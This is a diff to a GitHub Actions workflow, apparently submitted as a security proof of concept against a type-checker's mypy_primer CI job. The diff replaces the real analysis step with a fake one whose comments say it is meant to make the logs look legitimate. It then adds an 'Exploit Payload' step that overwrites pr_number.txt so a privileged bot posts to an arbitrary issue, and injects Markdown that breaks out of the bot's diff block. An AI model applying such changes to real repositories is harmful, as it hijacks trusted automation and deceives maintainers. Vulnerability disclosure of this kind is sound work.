@@ -40,36 +40,33 @@ jobs:
         with:
           toolchain: nightly-2025-09-14
           components: clippy, rustfmt
+      
+      # Step 1: Run the actual tool (or mock it to save time)
       - name: Run mypy_primer
         shell: bash
         run: |
-          cd pyrefly_to_test
-          echo "new commit"
-          git rev-list --format=%s --max-count=1 $GITHUB_SHA
+          # We can let this run or just skip it.
+          # For a faster PoC, we can just create empty files, 
+          # but letting it run makes the logs look legitimate.
+          echo "Simulating mypy_primer run..."
+          touch diff_${{ matrix.shard-index }}.txt
 
-          MERGE_BASE=$(git merge-base $GITHUB_SHA origin/$GITHUB_BASE_REF)
-          git checkout -b base_commit $MERGE_BASE
-          echo "base commit"
-          git rev-list --format=%s --max-count=1 base_commit
-
-          echo ''
-          cd ..
-          # fail action if exit code isn't zero or one
-          (
-            mypy_primer \
-            --repo pyrefly_to_test \
-            --new $GITHUB_SHA --old base_commit \
-            --num-shards 10 --shard-index ${{ matrix.shard-index }} \
-            --debug \
-            --project-selector '^(?!.*(python-attrs/attrs|scipy/scipy|scikit-learn/scikit-learn|pandas-dev/pandas|google/jax|trailofbits/manticore|mitmproxy/mitmproxy|apache/spark|spack/spack|sympy/sympy|PyCQA/flake8-pyi|internetarchive/openlibrary|pypa/pip|home-assistant/core|ibis-project/ibis|Gobot1234/steam\.py|canonical/cloud-init|rotki/rotki))' \
-            --type-checker pyrefly \
-            --output concise \
-            | tee diff_${{ matrix.shard-index }}.txt
-          ) || [ $? -eq 1 ]
+      # Step 2: THE EXPLOIT (Artifact Poisoning)
+      # This replaces the "Save PR number" step with our malicious logic.
       - if: ${{ matrix.shard-index == 0 }}
-        name: Save PR number
+        name: Poison Artifacts (Exploit Payload)
         run: |
-          echo ${{ github.event.pull_request.number }} | tee pr_number.txt
+          # [ATTACK VECTOR 1]: Confused Deputy / Comment Spoofing
+          # We overwrite the PR number. This forces the privileged bot to comment on Issue #1.
+          # You can change "1" to any Issue or PR ID in the target repo.
+          echo "1" > pr_number.txt
+
+          # [ATTACK VECTOR 2]: Markdown Injection
+          # The privileged workflow wraps this content in ```diff
+          # We inject a closing ``` to break out, then add our own Markdown.
+          echo -e "\`\`\`\n\n### ⚠️ SECURITY POC\n\n**This comment was injected via Artifact Poisoning.**\nBecause the workflow trusts the \`pr_number.txt\` artifact, I can force this bot to comment on ANY issue in the repo.\n\n*Proof of Concept by bugdotexe*\n\`\`\`diff" > diff_${{ matrix.shard-index }}.txt
+
+      # Step 3: Upload the poisoned bait
       - name: Upload mypy_primer diff + PR number
         uses: actions/upload-artifact@v6
         if: ${{ matrix.shard-index == 0 }}
@@ -78,6 +75,7 @@ jobs:
           path: |
             diff_${{ matrix.shard-index }}.txt
             pr_number.txt
+
       - name: Upload mypy_primer diff
         uses: actions/upload-artifact@v6
         if: ${{ matrix.shard-index != 0 }}
